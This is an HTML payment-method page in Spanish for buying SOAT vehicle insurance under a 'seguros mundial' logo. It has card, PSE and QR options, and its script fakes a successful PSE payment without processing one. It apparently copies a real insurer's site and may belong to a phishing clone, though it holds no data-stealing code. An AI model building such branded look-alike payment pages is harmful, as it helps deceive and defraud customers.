<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="theme-color" content="#FFFFFF">
<title>Medios de Pago | SOAT</title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="assets/css/component---src-pages-index-tsx.2f90ad7b25207235a98b.css">
<link rel="stylesheet" href="assets/css/commons.db02d5e21360139d3ecd.css">
<link rel="stylesheet" href="assets/css/styles.e0403c65ea02169718b0.css">
<link rel="stylesheet" href="assets/css/style-9faaa9e51cea5853.css">
<link rel="stylesheet" href="assets/css/styles_ltr.css">

<style>
  body {
    font-family: 'Ubuntu', Arial, sans-serif;
    background-color: #f4f7f9;
    color: #2c3e50;
    margin: 0;
    padding: 0;
  }
  .pago-container {
    max-width: 680px;
    margin: 32px auto;
    padding: 0 16px;
  }
  .pago-card {
    background: #ffffff;
    border-radius: 12px;
    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.06);
    padding: 26px;
  }
  .pago-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    flex-wrap: wrap;
    gap: 12px;
    border-bottom: 1px solid #e9eef2;
    padding-bottom: 16px;
    margin-bottom: 20px;
  }
  .pago-header h1 {
    margin: 0;
    font-size: 1.45rem;
    color: #066188;
  }
  .resumen-pago {
    background: #eef7fc;
    color: #066188;
    font-weight: 700;
    padding: 8px 14px;
    border-radius: 8px;
    font-size: 0.95rem;
  }
  .metodos-lista {
    display: flex;
    flex-direction: column;
    gap: 12px;
    margin-bottom: 20px;
  }
  .metodo-opcion {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 14px;
    border: 1px solid #dce6ee;
    border-radius: 10px;
    padding: 14px 16px;
    cursor: pointer;
    background: #ffffff;
    transition: border-color .2s ease, background .2s ease;
  }
  .metodo-opcion:hover {
    border-color: #0a99d6;
    background: #f9fcff;
  }
  .metodo-izq {
    display: flex;
    align-items: center;
    gap: 12px;
  }
  .metodo-izq input[type="radio"] {
    width: 18px;
    height: 18px;
    accent-color: #0a99d6;
    cursor: pointer;
  }
  .metodo-titulo {
    font-weight: 700;
    color: #1f2d3d;
    display: block;
  }
  .metodo-desc {
    font-size: 0.85rem;
    color: #6c7a89;
  }
  .metodo-logos {
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .metodo-logos img {
    height: 24px;
    width: auto;
    object-fit: contain;
  }
  #panel-pse {
    display: none;
    background: #f8fbfd;
    border: 1px solid #dce6ee;
    border-radius: 10px;
    padding: 16px;
    margin-bottom: 18px;
  }
  .campo-grupo {
    margin-bottom: 14px;
  }
  .campo-grupo:last-child {
    margin-bottom: 0;
  }
  .campo-grupo label {
    display: block;
    font-size: 0.88rem;
    font-weight: 600;
    color: #1f2d3d;
    margin-bottom: 6px;
  }
  .campo-grupo input,
  .campo-grupo select {
    width: 100%;
    box-sizing: border-box;
    padding: 10px 12px;
    border: 1px solid #cdd8e2;
    border-radius: 8px;
    font-size: 0.95rem;
    font-family: inherit;
    background: #ffffff;
    color: #1f2d3d;
  }
  #mensaje-errores {
    display: none;
    background: #fdecea;
    border: 1px solid #f5c2c0;
    color: #7a2a24;
    border-radius: 8px;
    padding: 12px 16px;
    margin-bottom: 16px;
  }
  .acciones-bar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 12px;
    margin-top: 20px;
    flex-wrap: wrap;
  }
  .btn-secundario {
    display: inline-block;
    padding: 12px 18px;
    border-radius: 8px;
    border: 1px solid #0a99d6;
    color: #0a99d6;
    background: #ffffff;
    text-decoration: none;
    font-weight: 600;
  }
  .btn-primario {
    padding: 13px 24px;
    border-radius: 8px;
    border: none;
    background: #0a99d6;
    color: #ffffff;
    font-size: 1rem;
    font-weight: 700;
    cursor: pointer;
  }
  .btn-primario:hover {
    background: #087daf;
  }
</style>
</head>
<body>

<!-- Aquí iba includes/header.php -->
<nav class="menu-module--menu--ff100">
  <div class="menu-module--menu__container--550e5">
    <div class="logo-module--wrapper__logo--d2507">
      <a href="index.html">
        <img class="safe-gatsby-image-module--safeImage--9bfbe menu-module--menu__container__logos__logo--30a8e"
             src="assets/img/imagen_1_.png"
             width="609" height="136" alt="seguros mundial" title="seguros mundial">
      </a>
    </div>
  </div>
</nav>

<main class="pago-container">
  <form class="pago-card" id="form-medio-pago" action="#" method="post" novalidate>
    <div class="pago-header">
      <h1>Elige tu medio de pago</h1>
      <div class="resumen-pago">
        Placa: <span id="pago-placa">ABC123</span> · Total: <span id="pago-total">$540.000</span>
      </div>
    </div>

    <div id="mensaje-errores">
      <strong>Revisa lo siguiente:</strong>
      <ul id="lista-errores" style="margin:8px 0 0 18px;padding:0;"></ul>
    </div>

    <div class="metodos-lista">
      <label class="metodo-opcion">
        <div class="metodo-izq">
          <input type="radio" name="medio_pago" value="tarjeta" checked>
          <div>
            <span class="metodo-titulo">Tarjeta Crédito / Débito</span>
            <span class="metodo-desc">Completa los datos de tu tarjeta en el siguiente paso</span>
          </div>
        </div>
        <div class="metodo-logos">
          <img src="assets/img/visa.png" alt="Visa">
          <img src="assets/img/master_card.png" alt="Mastercard">
        </div>
      </label>

      <label class="metodo-opcion">
        <div class="metodo-izq">
          <input type="radio" name="medio_pago" value="pse">
          <div>
            <span class="metodo-titulo">PSE</span>
            <span class="metodo-desc">Débito desde cuenta de ahorros o corriente</span>
          </div>
        </div>
        <div class="metodo-logos">
          <img src="assets/img/pse.png" alt="PSE">
        </div>
      </label>

      <label class="metodo-opcion">
        <div class="metodo-izq">
          <input type="radio" name="medio_pago" value="qr">
          <div>
            <span class="metodo-titulo">Código QR / Bre-B / Billeteras</span>
            <span class="metodo-desc">Escanea el código QR y confirma tu pago</span>
          </div>
        </div>
        <div class="metodo-logos">
          <img src="assets/img/br-b.png" alt="Bre-B">
          <img src="assets/img/logo_nequi.png" alt="Nequi">
          <img src="assets/img/Bancolombia.png" alt="Bancolombia">
        </div>
      </label>
    </div>

    <div id="panel-pse">
      <div class="campo-grupo">
        <label for="pse-tipo-persona">Tipo de persona</label>
        <select id="pse-tipo-persona" name="tipo_persona">
          <option value="Natural">Persona Natural</option>
          <option value="Juridica">Persona Jurídica</option>
        </select>
      </div>
      <div class="campo-grupo">
        <label for="pse-banco">Banco</label>
        <select id="pse-banco" name="banco">
          <option value="">Selecciona tu banco</option>
          <option value="Bancolombia">Bancolombia</option>
          <option value="Nequi">Nequi</option>
          <option value="Banco de Bogotá">Banco de Bogotá</option>
          <option value="Davivienda">Davivienda</option>
          <option value="BBVA Colombia">BBVA Colombia</option>
          <option value="Banco de Occidente">Banco de Occidente</option>
        </select>
      </div>
      <div class="campo-grupo">
        <label for="pse-correo">Correo electrónico</label>
        <input type="email" id="pse-correo" name="correo" placeholder="correo@ejemplo.com">
      </div>
    </div>

    <div class="acciones-bar">
      <a href="informacion-vehiculo.html" class="btn-secundario">Volver al resumen</a>
      <button type="submit" class="btn-primario" id="btn-continuar-pago">Continuar</button>
    </div>
  </form>
</main>

<!-- Aquí iba includes/footer.php -->

<script>
(function () {
  'use strict';

  function leerJSON(key) {
    var raw = sessionStorage.getItem(key) || localStorage.getItem(key);
    if (!raw) return null;
    try { return JSON.parse(raw); } catch (e) { return null; }
  }

  var resumen = leerJSON('resumen_soat') || {};
  var cotizacion = leerJSON('cotizacion_soat') || {};

  var placa = resumen.placa || cotizacion.placa || 'ABC123';
  var total = resumen.total_formato || '$540.000';

  document.getElementById('pago-placa').textContent = placa;
  document.getElementById('pago-total').textContent = total;

  var radios = document.querySelectorAll('input[name="medio_pago"]');
  var panelPse = document.getElementById('panel-pse');

  function actualizarPanelMedio() {
    var sel = document.querySelector('input[name="medio_pago"]:checked');
    var val = sel ? sel.value : 'tarjeta';
    panelPse.style.display = (val === 'pse') ? 'block' : 'none';
  }

  radios.forEach(function (r) {
    r.addEventListener('change', actualizarPanelMedio);
  });
  actualizarPanelMedio();

  var form = document.getElementById('form-medio-pago');
  var boxErrores = document.getElementById('mensaje-errores');
  var listaErrores = document.getElementById('lista-errores');

  form.addEventListener('submit', function (e) {
    e.preventDefault();

    var sel = document.querySelector('input[name="medio_pago"]:checked');
    var medio = sel ? sel.value : 'tarjeta';
    var errores = [];

    var detalle = {
      medio: medio.toUpperCase(),
      placa: placa,
      total: total,
      fecha: new Date().toISOString()
    };

    if (medio === 'pse') {
      var tipoPersona = document.getElementById('pse-tipo-persona').value;
      var banco = document.getElementById('pse-banco').value;
      var correo = document.getElementById('pse-correo').value.trim();

      if (!banco) {
        errores.push('Selecciona un banco para continuar con PSE.');
      }
      if (!correo || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(correo)) {
        errores.push('Ingresa un correo electrónico válido para PSE.');
      }

      detalle.tipo_persona = tipoPersona;
      detalle.banco = banco;
      detalle.correo = correo;
    }

    if (errores.length > 0) {
      listaErrores.innerHTML = '';
      errores.forEach(function (err) {
        var li = document.createElement('li');
        li.textContent = err;
        listaErrores.appendChild(li);
      });
      boxErrores.style.display = 'block';
      boxErrores.scrollIntoView({ behavior: 'smooth', block: 'center' });
      return;
    }

    boxErrores.style.display = 'none';
    sessionStorage.setItem('ultimo_intento_pago', JSON.stringify(detalle));

    if (medio === 'tarjeta') {
      window.location.href = 'pago-con-tarjeta.html';
    } else if (medio === 'qr') {
      window.location.href = 'qr/index.html';
    } else {
      window.location.href = 'pago-exitoso.html';
    }
  });
})();
</script>

</body>
</html>
